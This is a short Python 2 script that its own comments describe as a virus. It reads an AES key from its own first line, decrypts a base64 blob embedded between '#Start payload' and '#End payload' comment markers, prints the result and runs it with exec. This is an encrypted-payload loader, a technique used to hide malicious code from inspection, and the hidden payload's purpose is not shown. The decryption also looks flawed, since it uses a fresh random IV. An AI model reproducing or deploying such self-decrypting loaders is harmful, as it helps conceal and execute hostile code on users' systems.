print "Hello0000000000000sfhldskjfhdjslakfhdjlksafhjldsakhfjads"
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload